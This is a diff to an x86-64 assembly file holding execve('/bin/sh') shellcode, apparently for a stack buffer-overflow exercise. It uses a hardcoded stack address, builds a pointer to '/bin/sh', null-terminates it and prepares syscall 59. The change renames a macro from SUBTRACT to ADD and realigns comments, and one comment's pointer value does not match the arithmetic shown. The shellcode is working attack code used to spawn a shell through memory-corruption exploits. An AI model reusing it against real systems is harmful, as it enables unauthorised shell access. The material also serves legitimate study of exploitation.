@@ -5,7 +5,7 @@
 #include <sys/syscall.h>
 
 #define buffer 0x7fffffffe910
-#define SUBTRACT(X, Y) (X + Y)
+#define ADD(X, Y) (X + Y)
 
 .globl main
         .type   main, @function
@@ -17,12 +17,12 @@ main:
         shl     $32, %rcx
 
         xor     %rax, %rax
-        xor     $SUBTRACT(buffer, 57), %eax
-        xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
+        xor     $ADD(buffer, 57), %eax   /* lower part of ptr to str "/bin/sh" */
+        xor     %rax, %rcx               /* %rcx=0x00007fffffffdf50 (ptr to str   "/bin/sh") */
 
         xor     %rax, %rax
         mov     %al, 7(%rcx)             /* Add '\0' to "/bin/sh" */
-        movq    %rcx, 8(%rcx)           /* Ptr to ['/bin/sh'] */
+        movq    %rcx, 8(%rcx)            /* Ptr to ['/bin/sh'] */
 
         mov     $59, %al                 /* syscall arg 1: syscall number execve(59) */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
